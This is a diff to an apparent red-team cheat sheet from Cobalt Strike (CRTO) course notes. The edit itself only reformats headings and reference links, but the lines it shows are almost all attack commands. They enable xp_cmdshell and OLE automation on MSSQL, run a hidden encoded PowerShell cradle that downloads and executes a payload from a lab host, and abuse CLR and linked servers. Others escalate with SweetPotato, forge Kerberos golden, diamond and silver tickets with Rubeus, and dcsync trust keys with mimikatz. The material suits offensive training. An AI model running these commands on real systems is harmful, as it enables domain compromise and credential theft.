-**# Code Execution
-## xp_cmdshell**
+# Code Execution
+## xp_cmdshell
 sql-query lon-db-1 "SELECT name,value FROM sys.configurations WHERE name = 'xp_cmdshell'"
 sql-enablexp lon-db-1
 sql-xpcmd lon-db-1 "hostname && whoami"
 sql-disablexp lon-db-1
-**## OLE Automation**
+## OLE Automation
 sql-query lon-db-1 "SELECT name,value FROM sys.configurations WHERE name = 'Ole Automation Procedures'"
 sql-enableole lon-db-1
 sql-olecmd lon-db-1 "cmd /c calc"
@@ -840,13 +840,13 @@ $cmd = 'iex (new-object net.webclient).downloadstring("http://lon-wkstn-1:8080/b
 [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($cmd))
 sql-olecmd lon-db-1 "cmd /c powershell -w hidden -nop -enc [ONE-LINER]"
 link lon-db-1 TSVCPIPE-4b2f70b3-ceba-42a5-a4b5-704e1c41337
-**## SQL Common Language Runtime**
+## SQL Common Language Runtime
 sql-query lon-db-1 "SELECT value FROM sys.configurations WHERE name = 'clr enabled'"
 sql-enableclr lon-db-1
 sql-disableclr lon-db-1
 sql-clr lon-db-1 C:\Users\Attacker\source\repos\ClassLibrary1\bin\Release\ClassLibrary1.dll MyProcedure
 
-**# Linked Servers**
+# Linked Servers
 sql-links lon-db-1
 ## Excute Commands on linked DB
 sql-query lon-db-1 "SELECT @@SERVERNAME" "" lon-db-2
@@ -856,7 +856,7 @@ sql-checkrpc lon-db-1
 sql-enablerpc lon-db-1 lon-db-2
 sql-clr lon-db-1 C:\Users\Attacker\source\repos\ClassLibrary1\bin\Release\ClassLibrary1.dll MyProcedure "" lon-db-2
 
-**# Local PrivEsc**
+# Local PrivEsc
 ## Having a shell as a service account NT Service\MSSQLSERVER
 execute-assembly C:\Tools\SweetPotato\bin\Release\SweetPotato.exe -p "C:\Windows\ServiceProfiles\MSSQLSERVER\AppData\Local\Microsoft\WindowsApps\tcp-local_x64.exe"
 connect localhost 1337
@@ -865,21 +865,21 @@ connect localhost 1337
 ## **Trusts Attacks**
 
 ```powershell
-**# Parent/Child Trusts**
+# Parent/Child Trusts
 C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe golden /aes256:child_domain_krbkey /user:Administrator /domain:child_domain /sid:child_domainSID /sids:EA_GroupSID /nowrap
 ## Using Diamond Ticket technique
 execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /sids:EA_GroupSID /krbkey:child_domain_krbkey /nowrap
 
-**# One-Way Inbound Trusts**
+# One-Way Inbound Trusts
 ## Get a TGT / Referral tickets Using Domain Trust / inter-realm Key 
 dcsync contoso.com CONTOSO\PARTNER$
 C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe silver /user:pchilds /domain:CONTOSO.COM /sid:trusted_domainSID /id:1105 /groups:513,1106,foreign_group_RID /service:krbtgt/partner.com /rc4:inter_relam_key /nowrap
 ## Get TGS
 execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgs /service:cifs/par-jmp-1.partner.com /dc:trusting_domain_dc /ticket:doIFM /nowrap
 
-**# One-Way Outbound Trusts**
+# One-Way Outbound Trusts
 ## Get a Copy of the trust account key from the trusting domain TDO
-****mimikatz lsadump::dcsync /domain:partner.com /guid:{288d9ee6-2b3c-42aa-bef8-959ab4e484ed}
+mimikatz lsadump::dcsync /domain:partner.com /guid:{288d9ee6-2b3c-42aa-bef8-959ab4e484ed}
 ## Get a TGT from the trusted domain, after that you can enumerate the trusted domain and its users
 execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:PARTNER$ /domain:trusted_domain /dc:trusted_domain_dc  /rc4:inter_relam_key /nowrap
 ```
@@ -954,9 +954,9 @@ execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:PART
 
 ## **References**
 
-- https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/appendix-a_beacon-opsec-considerations.htm
-- https://www.cobaltstrike.com/blog/why-is-rundll32-exe-connecting-to-the-internet
-- https://www.cobaltstrike.com/blog/cobalt-strike-3-8-whos-your-daddy
-- https://github.com/WKL-Sec/Malleable-CS-Profiles
+- [https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/appendix-a_beacon-opsec-considerations.htm](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/appendix-a_beacon-opsec-considerations.htm)
+- [https://www.cobaltstrike.com/blog/why-is-rundll32-exe-connecting-to-the-internet](https://www.cobaltstrike.com/blog/why-is-rundll32-exe-connecting-to-the-internet)
+- [https://www.cobaltstrike.com/blog/cobalt-strike-3-8-whos-your-daddy](https://www.cobaltstrike.com/blog/cobalt-strike-3-8-whos-your-daddy)
+- [https://github.com/WKL-Sec/Malleable-CS-Profiles](https://github.com/WKL-Sec/Malleable-CS-Profiles)
 - [https://www.youtube.com/playlist?list=PL9HO6M_MU2nfQ4kHSCzAQMqxQxH47d1no](https://www.youtube.com/playlist?list=PL9HO6M_MU2nfQ4kHSCzAQMqxQxH47d1no)
-- [https://github.com/An0nUD4Y/CRTO-Notes/blob/main/CRTO - Cheatsheet.md](https://github.com/An0nUD4Y/CRTO-Notes/blob/main/CRTO%20-%20Cheatsheet.md)
+- [https://github.com/An0nUD4Y/CRTO-Notes/blob/main/CRTO-Cheatsheet.md](https://github.com/An0nUD4Y/CRTO-Notes/blob/main/CRTO%20-%20Cheatsheet.md)
